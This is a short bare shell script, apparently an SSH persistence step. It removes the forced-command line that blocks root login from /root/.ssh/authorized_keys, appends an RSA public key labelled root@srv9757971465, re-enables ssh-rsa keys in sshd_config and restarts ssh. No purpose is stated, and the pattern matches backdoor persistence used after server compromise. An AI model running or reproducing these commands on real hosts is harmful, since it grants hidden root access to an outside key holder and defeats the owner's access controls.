mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXkk92NX8RLKvyX1jwe7h8ECepg8VeAgPW+DlW83mE8akjcT+u91G4Dey9IDCjDXUUuUOEL4u5DT47Q72SAL5kIG4kWkpRKrGtOAK1cmV5RDKEwpD8zAOLPjJBW2+iYDLVXsoD8TMxIEwjTmFbeqmL0tjd5msnAGHLgXSWpoWsHxL+c2NwsFBhGTBSY0OsLb495OJEWn6/uPESF6wAu3IrCaJJ67UiRkpzPNiZIV7PjNap9ciwuHdu5sljhacXrwKFFyO7S3bewEenzw6lOYuWcOIV9priK/jlCwIuaMxOKy7J3A4onkrVIi9Pz/YdJP1D6QugntSr46JU4FAgwTwWuyMwHvwyZ3hlwl1+u2bu7xLqAhDkjQJl+FttyUb45Kxcw+i3lvmDmmfTF7MQ4MLI20+XWbR6Eu9cZTq1kkC8Bg1So5XgeYIjCnDGa2i+/Nq2vqqKMYUfvndfyhhoQ68zpy41Ac8BdT+qrTocD0r+3ysTcIvGwJu8aJKDtuv6N10= root@srv9757971465" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;
